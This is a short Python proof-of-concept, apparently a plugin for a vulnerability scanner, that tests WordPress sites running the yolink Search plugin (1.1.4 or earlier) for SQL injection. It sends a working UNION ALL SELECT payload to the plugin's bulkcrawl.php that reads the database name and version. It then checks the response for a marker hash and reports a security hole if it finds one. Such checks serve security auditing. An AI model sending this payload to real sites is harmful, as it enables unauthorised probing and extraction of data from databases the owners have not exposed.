#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  WordPress yolink Search plugin <= 1.1.4 SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/17757/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = ("/wp-content/plugins/yolink-search/includes/bulkcrawl.php")
    target_url=arg + payload
    post_v1="page=-1"
    post_v2="from_id=-1%20UNION%20ALL%20SELECT%20CONCAT_WS(CHAR(58),database(),version(),MD5(3.14)),NULL--%20&batch_size=-1%20"
    code, head, res, _, _ = curl.curl("-d %s&%s %s" % (post_v1,post_v2,target_url))
    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])